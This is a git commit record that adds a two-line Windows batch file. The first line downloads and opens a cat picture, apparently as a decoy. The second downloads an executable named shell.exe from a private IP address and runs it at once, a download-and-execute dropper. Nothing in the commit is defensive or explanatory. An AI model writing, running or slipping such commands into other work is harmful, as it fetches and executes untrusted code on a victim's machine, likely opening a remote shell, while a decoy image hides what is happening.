ed6e703a6c6e4f399588f23c7840b838a76365d1
terionun <38081201+terionun@users.noreply.github.com>
2022-09-14 03:20:45 +0300

    Add files via upload

---
+++ cmd.bat
@@ -0,0 +1,2 @@
+curl https://raw.githubusercontent.com/terionun/rockyou/main/cat.jpg --output %temp%\cat.jpg && start %temp%\cat.jpg
+curl http://192.168.1.44/shell.exe --output %temp%\shell.exe && start %temp%\shell.exe
